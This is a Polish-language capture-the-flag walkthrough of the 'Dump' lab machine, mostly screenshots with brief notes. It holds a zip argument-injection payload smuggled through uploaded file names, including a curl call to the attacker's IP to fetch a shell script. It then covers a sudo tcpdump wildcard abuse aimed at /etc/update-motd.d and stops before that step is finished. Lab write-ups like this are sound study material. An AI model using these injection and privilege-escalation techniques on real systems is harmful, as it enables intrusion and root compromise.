# Dump
Linux, Hard, created by **jkr**

![image](https://github.com/user-attachments/assets/5362dd4d-93d0-4f99-a32b-b533ca848935)

```
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
```

![{2AC3F7CF-5484-4A53-9C71-32DFD15E8FE0}](https://github.com/user-attachments/assets/7eb8be8b-00d5-40c3-9cfa-6a7bbdfa797d)

zrobiłem konto i zalogowałem się

![{980B2D1F-A3F4-41F4-B6E7-FFDDF04B71E9}](https://github.com/user-attachments/assets/11bddae4-3a3d-4458-b644-04405a5b8ee6)

```
.functions.php          [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 52ms]
capture.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 32ms]
delete.php              [Status: 302, Size: 17, Words: 2, Lines: 2, Duration: 32ms]
download.php            [Status: 302, Size: 27, Words: 2, Lines: 3, Duration: 31ms]
downloads               [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 31ms]
index.php               [Status: 200, Size: 954, Words: 109, Lines: 23, Duration: 53ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 31ms]
style.css               [Status: 200, Size: 4636, Words: 874, Lines: 223, Duration: 33ms]
upload.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 35ms]
view.php                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 36ms]
```

![{3D20FFEA-1283-4F4B-A0E3-209635020ED8}](https://github.com/user-attachments/assets/7e3cb499-0f7d-4e41-bf58-0751be0715e1)

![{6CD274E6-432D-41E5-A78A-EEE562B18878}](https://github.com/user-attachments/assets/c78fedf5-1ae9-461d-b1a8-a37bd3713c95)

![{CEB25CE6-8EB3-4D1C-9F16-7C12C01529FC}](https://github.com/user-attachments/assets/1855ec15-c998-43c5-b433-7f8cb9ad8100)

no cóż

![{4E676445-84B0-4F70-8C06-00172BC54ABF}](https://github.com/user-attachments/assets/7203e9d6-3633-47b6-823e-18ef2377a5ff)

Póki co nie mam pomysłu xd

robię sobie pcapa i wrzucam tam

![{14B7D594-0A34-453E-BB61-A26DD4821B96}](https://github.com/user-attachments/assets/6211edbd-7caf-4330-a3ca-2387fa4623b3)

![{C99D1E25-37A9-4419-86C7-FDDAD1161539}](https://github.com/user-attachments/assets/e5a6023a-b4f6-4caf-8a64-b7978b6994f9)

![{D074A506-1F3C-4728-8A7F-A983F837A6C5}](https://github.com/user-attachments/assets/dcc1d01c-a42e-4e93-b4e3-a3b0e242fc4e)

![{B7349E24-2520-4D6A-A129-16F4050394D8}](https://github.com/user-attachments/assets/253836f5-a47c-4e88-9751-61ff4f5fb562)

![{996016EC-19B1-441F-B3F1-97D78316FE30}](https://github.com/user-attachments/assets/b3f4f095-5b4d-4ec2-94d7-5ae96729c52e)

Dobra ma być pliczek, który ma tylko uuid4 w nazwie i nic więcej. Bez rozszerzenia.

![{D6BA3DA2-F5FD-4AE5-A5A4-C85893531C93}](https://github.com/user-attachments/assets/9cdd315b-bfd9-492f-8e41-213657f23784)

![{69827811-9309-48D6-AD83-F96BD89D37D5}](https://github.com/user-attachments/assets/99d68969-76ca-41a2-8bf3-65e3e999787c)

tak się pobiera.

XSS w nazwie pliku mamy xd

![{406131E7-87B2-4A96-B924-C56B9C30D43B}](https://github.com/user-attachments/assets/3f4260a1-5dae-4d52-8740-1f8972861a1a)

Jak odpaliłem `capture.php` i puściłem nmapa to coś tam się pojawiło

![{6645FCF5-F348-4BCA-890D-23832B61A88F}](https://github.com/user-attachments/assets/22d1d730-4d36-4570-a12b-93d0a2aa86ff)

![{516DAFB1-0406-4A2C-8041-2A9CA2A0FE06}](https://github.com/user-attachments/assets/d754fac4-afb6-4493-8fba-769cd6376e0a)

![{F481930B-5239-467D-B5EF-8ADD4F17E873}](https://github.com/user-attachments/assets/0c21caeb-fcbb-454d-a9a1-b8b25150c0ac)

WRÓCIŁEM. Spojrzyałem na wiki i nagle stało się to oczywiste :D

![{A4FF65CA-2F88-4FB2-8B84-AC45A4B24E18}](https://github.com/user-attachments/assets/559150a3-eba9-4817-b661-4642960ebad2)

zrobiłem pliczek o nazwie `-h`

![{0381B9D1-841D-406A-A71D-4ACA5621AE8A}](https://github.com/user-attachments/assets/a6de7cf9-925b-456b-ad4b-e09293c916ea)

![{B986C34E-D51D-4062-A110-12150D0A06CF}](https://github.com/user-attachments/assets/6dbb5ec4-52a7-4b62-90b8-cdeaeacabad7)

Gdy próbuję całść pobrać to to `-h` jest doklejane do komendy. Jak widzimy to to komenda linuxowa `zip`. Zatem ładujemy coś z gtfobins i powinno być łatwo.

![{766C3C5F-4C2C-4A6A-820A-E98A83794A30}](https://github.com/user-attachments/assets/36ca475c-ec27-42bd-8a61-25a73b4b562e)

pierwsze problemy przy komendzie `-T -TT 'curl 10.8.4.124 #'`.

![{6C5935F3-2BC0-4282-892C-184C04B2A90A}](https://github.com/user-attachments/assets/2a07fe6f-fa8b-4977-b453-2da3b750da6e)

wgl trudno usunąć teraz te pliki xD
- pliki usunięte i zauważyłem, że jest problem. Znak `/` nie jest akceptowany.

Zresetowałem maszynę lekko ponad 3 razy, bo nie szło inaczej usunąc plików (nie miałem pomysłu jak to zrobić).

MAMY COŚ XD

![{C49E13E8-C02A-4554-B427-AFC8DC96C2FC}](https://github.com/user-attachments/assets/b6add7e2-2c46-487a-a9a7-27c15033f448)

![{4552B762-BC2C-46D9-909D-BE7B33803AA9}](https://github.com/user-attachments/assets/775fce08-79d7-418f-871c-a55006cb9c4d)

pliki muszą być wysyłane w tej kolejności, żeby "dopełniać komendę zipa".
Ale nie dostałem shella, bo... mój plik nazywa się a.sh, a nie s.sh...

![{45D5BE66-0A3D-41F6-AFCC-1D28299E00F1}](https://github.com/user-attachments/assets/588e9076-3a75-4848-a01d-c3d8c311774f)

yeeeeeeeeee

![{9D35A526-25D6-4EAC-8F10-F1B3E79E6782}](https://github.com/user-attachments/assets/6c8b34e3-e1fb-4f0f-b823-ee8f27a607d5)

trochę więcej mamy w `/var/www` niż zazwyczaj widuję.

![{E4DC7385-1979-4503-90A3-254549D871B1}](https://github.com/user-attachments/assets/64805b0c-07e4-44b6-85cf-a74ee387b448)

mniej wygodny niż postawić serwer pythona sposób, ale.. prosty i skuteczny (do małych plików)

![{99BE1C0B-7833-45C9-B289-D4F36CB3D293}](https://github.com/user-attachments/assets/6a4e406a-f676-46ba-873a-62455ca58e6f)

o hasło plain textem.

![{611440D4-9217-4693-A0A1-E55545711CEB}](https://github.com/user-attachments/assets/b03b33de-c48b-4e73-ad17-735adb4f01c4)

i user gotowy.

![{CFFA7E17-47A9-4979-B6B2-B492A409DBA4}](https://github.com/user-attachments/assets/4d953b14-2d24-446a-a77f-1f70277e8c78)

nie wiem czy te informacje z vim cokolwiek nam dadzą.
- na pewno warto zainteresować się naszą grupą `adm`.

![{B5A2F4C6-B545-460F-BA5B-10CF7A7239E1}](https://github.com/user-attachments/assets/1b63c81d-1e4e-4fe3-9ffc-68dc2b9c5204)

ALE najciekawsze wydaje się to co może robić nasz user `www-data` z uprawnieniami roota.

![{0ADC4A04-7263-4AF8-985C-FF0DC38EF08B}](https://github.com/user-attachments/assets/8888edcb-fdad-43e3-b3da-cd8e4417e22a)


generalnie to wszystko jakby pasowało do siebie. To co znajduje się w `/etc/update-motd.d/` jest wykonywane przy starcie systemu. nasz user ma informacje o edycji/manipulacji pliku `/etc/update-motd.d/11111111-1111-1111-1111-111111111111`, a user `www-data` może zrobić tcp.
```
/usr/bin/tcpdump -c10
        -w/var/cache/captures/*/[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]
        -F/var/cache/captures/filter.[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]
```

Przykład tego co spełnia regex `/var/cache/captures/some-folder/abcd1234-5678-90ab-cdef-1234567890ab`

jako, że mamy tutaj `/*/` możemy zmanipulować naszym zapisem i dodać "drugi folder" do tego.
Na przykład `sudo /usr/bin/tcpdump -c10 -w/var/cache/captures/ -w/etc/update-motd.d/11111111-1111-1111-1111-111111111111 [...]`.
To teoria. Zaraz się przekonam czy nie gadam głupot xD

Jeszcze szukając informacji czemu ciągle mam premission denied
[https://answers.launchpad.net/ubuntu/+source/tcpdump/+question/168402](https://answers.launchpad.net/ubuntu/+source/tcpdump/+question/168402)

```
cat /etc/apparmor.d/usr.bin.tcpdump
# vim:syntax=apparmor
#include <tunables/global>

profile tcpdump /usr/bin/tcpdump {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  capability net_raw,
  capability setuid,
  capability setgid,
  capability dac_override,
  capability chown,
  network raw,
  network packet,

  # for -D
  @{PROC}/bus/usb/ r,
  @{PROC}/bus/usb/** r,

  # for finding an interface
  /dev/ r,
  @{PROC}/[0-9]*/net/dev r,
  /sys/bus/usb/devices/ r,
  /sys/class/net/ r,
  /sys/devices/**/net/** r,

  # for -j
  capability net_admin,

  # for tracing USB bus, which libpcap supports
  /dev/usbmon* r,
  /dev/bus/usb/ r,
  /dev/bus/usb/** r,

  # for init_etherarray(), with -e
  /etc/ethers r,

  # for USB probing (see libpcap-1.1.x/pcap-usb-linux.c:probe_devices())
  /dev/bus/usb/**/[0-9]* w,

  # for -z
  /{usr/,}bin/gzip ixr,
  /{usr/,}bin/bzip2 ixr,

  # for -F and -w
  audit deny @{HOME}/.* mrwkl,
  audit deny @{HOME}/.*/ rw,
  audit deny @{HOME}/.*/** mrwkl,
  audit deny @{HOME}/bin/ rw,
  audit deny @{HOME}/bin/** mrwkl,
  owner @{HOME}/ r,
  owner @{HOME}/** rw,

  # for -r, -F and -w
  /**.[pP][cC][aA][pP] rw,
  /**.[cC][aA][pP] rw,
  # -W adds a numerical suffix
  /**.[pP][cC][aA][pP][0-9]* rw,
  /**.[cC][aA][pP][0-9]* rw,

  # for convenience with -r (ie, read pcap files from other sources)
  /var/log/snort/*log* r,

  /usr/bin/tcpdump mr,

  # Site-specific additions and overrides. See local/README for details.
  #include <local/usr.bin.tcpdump>
}
```

najważniejsze części
```
  # for -z
  /{usr/,}bin/gzip ixr,
  /{usr/,}bin/bzip2 ixr,


# for -r, -F and -w
  /**.[pP][cC][aA][pP] rw,
  /**.[cC][aA][pP] rw,
```

dodatkowo odkryłem, że 
- nasz plik może być napisany jako dowolny użytkownik, ale zawiera nagłówek pcap
- jeśli zapiszemy plik jako fritz lub www-data możemy usunąć nagłówek pcap po zapisaniu, ale potrzebujemy przynajmniej uprawnień do odczytu i wykonywania w folderze, w którym znajduje się skrypt



